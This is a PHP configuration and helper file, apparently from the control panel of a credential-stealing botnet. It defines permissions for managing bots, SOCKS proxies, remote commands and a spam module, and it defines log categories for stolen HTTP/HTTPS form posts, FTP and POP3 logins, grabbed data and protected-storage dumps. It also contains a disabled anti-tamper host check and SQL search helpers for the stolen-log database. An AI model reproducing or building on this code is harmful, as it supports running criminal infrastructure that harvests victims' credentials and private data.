<?php error_reporting(E_ALL);set_time_limit(0);

function __CheckHostURL($s)
{
  return true;
  //Антихак через инклуды
  $l = @get_included_files();
  if(@count($l) !== 2 || @strcmp(@basename($l[0]), $s) !== 0 || @strcmp(@basename($l[1]), 'global.php') !== 0)__abuse();
  
  //Host
  $h = @getallheaders();
  $t1 = '#';
  foreach($h as $a => $b)if(@strcmp($a, 'Host') == 0){$t1 = trim($b); break;}
  
  //Script
  $t2 = @$_SERVER['PHP_SELF'];
  if(@strcmp(@basename($t2), $s) !== 0)__abuse();
  $t2 = @str_replace('\\', '/', @dirname($t2));
  if(@substr($t2, 0, 1) !== '/')$t2 = '/'.$t2;
  if(@substr($t2, -1, 1) !== '/')$t2 .= '/';
  
  //Combine
  $t1 = $t1.$t2;
  
  //Check
  $x = array(/*HOST_URL*/);
  foreach($x as $a)
  {
    if($a === 'UU')return true;
    else if(@substr($a, 0, 8) === 'https://')
    {
      if(@strcmp(@substr($a, 8), $t1) === 0)return true;
    }
    else if(@substr($a, 0, 7) === 'http://')
    {
      if(@strcmp(@substr($a, 7), $t1) === 0)return true;
    }
  }
  die('45DD1200');
}
function __abuse()
{
  die('D4801E0F');
}

if(($p=isset($_SERVER['SCRIPT_NAME'])?dirname($_SERVER['SCRIPT_NAME']):'')=='')$p='/';
define('SCRIPT_ROOT',str_replace('\\','/',$p));

define('LNG_LIST','English|en,Russian|ru');
define('LNG_DEF','en');

define('PRIV_STATS',              0x00000001);
  define('PRIV_STATS_LOGS',       0x00000002);
  define('PRIV_STATS_STATS',      0x00000004);
  define('PRIV_STATS_RESET',      0x00000008);
define('PRIV_SPAMBOT',            0x00200000);
define('PRIV_BOTS',               0x00000020);
  define('PRIV_BOTS_SOCKS',       0x00000040);
  define('PRIV_BOTS_PROXY',       0x00040000);
  define('PRIV_BOTS_LC_SS',       0x00000080);
  define('PRIV_BOTS_LC_KOS',      0x00000010);
  define('PRIV_BOTS_CMDS',        0x00000100);
    define('PRIV_BOTS_CMDS_EDIT', 0x00000200);
define('PRIV_USERS',              0x00000400);
  define('PRIV_USERS_EDIT',       0x00000800);
define('PRIV_USER',               0x00001000);
define('PRIV_LOGS_DB',            0x00002000);
define('PRIV_LOGS_DB_EDIT',       0x00004000);
define('PRIV_LOGS_DBT',           0x00008000);
define('PRIV_LOGS_DBT_EDIT',      0x00010000);
define('PRIV_LOGS_FILES',         0x00080000);
define('PRIV_LOGS_FILES_EDIT',    0x00100000);
define('PRIV_OPTIONS',            0x00020000);
define('PRIV_UPDATECP',           0x40000000);

define('MODULE_LOGS',         0x0001);
  define('MODULE_LOGS_DB',    0x0002);
    define('MODULE_LOGS_TMPS',0x0004);
    define('MODULE_LOGS_WDB', 0x0008);
  define('MODULE_LOGS_WFS',   0x0010);
    define('MODULE_LOGS_FS',  0x0020);
  define('MODULE_LOGS_FILES', 0x1000);
define('MODULE_SPAMBOT',      0x2000);
define('MODULE_BOTS',         0x0040);
  define('MODULE_BOTS_SOCKS', 0x0080);
  define('MODULE_BOTS_PROXY', 0x0800);
  define('MODULE_BOTS_LC_SS', 0x0100);
  define('MODULE_BOTS_CMDS',  0x0200);
define('MODULE_USERS',        0x0400);

define('LOGTYPE_UNKNOWN',     0);
define('LOGTYPE_HTTP_POST',   1);
define('LOGTYPE_HTTPS_POST',  2);
define('LOGTYPE_TELNET_FTP',  3);
define('LOGTYPE_TELNET_POP3', 4);
define('LOGTYPE_GRABBED_DATA',5);
define('LOGTYPE_PSTORE',      6);
define('LOGTYPE_FTHISTORY',   7);

define('COOKIE_LIVETIME',time()+3600*24*30);
define('MAX_BTONT',9999);
define('FILE_CONFIG','system/config.php');
define('DEF_BOTNET','main');

function strips(&$el){if(is_array($el))foreach($el as $k => $v)strips($el[$k]);else $el = stripslashes($el);}
if(get_magic_quotes_gpc()){strips($_POST);strips($_GET);}
function createdir($dir){$ll=explode('/',str_replace('\\','/',$dir));$cur = '';foreach($ll as $d)if($d!='..'&&$d!='.'&&strlen($d)>0){$cur.=$d.'/';if(!is_dir($cur)&&!mkdir($cur,0777))return false;}return true;}
function Str2SQL($pr, $var, $str, $cs, $strong)
{
  if($str == '*')return '';
  $list = explode(' ', trim(preg_replace('#\s+#', ' ', $str)));
  if(empty($list))return '';
  $prev = $type = ' OR ';
  $pref = ' ';
  $str = '';
  foreach($list as $v)
  {
    if($v == 'OR'){$type = ' OR '; $pref = ' ';}
    else if($v == 'AND'){$type = ' AND '; $pref = ' ';}
    else if($v == 'NOT'){$type = ' AND '; $pref = ' NOT ';}
    else
    {
      $v = str_replace(array('%', '_','*','#'), array('\%', '\_','%','_'), ($strong || strstr($v, '*')) ? $v : '*'.$v.'*');
      $str .= (empty($str) ? '' : $type).$var.$pref.'LIKE'.($cs ? ' BINARY' : '').' \''.addslashes($v).'\'';
      continue;
    }
    if($type != $prev && !empty($str))$str = '('.$str.')';
    $prev = $type;
  }
  return ($pr ? ' AND ' : ' ').'('.$str.')';
}

function ftime($fmt, $t)
{
  return gmdate($fmt, $t);
}

function fmktime($hour, $minute, $second, $month, $day, $year)
{
  return mktime($hour, $minute, $second, $month, $day, $year, 0) + date('Z');
}

?>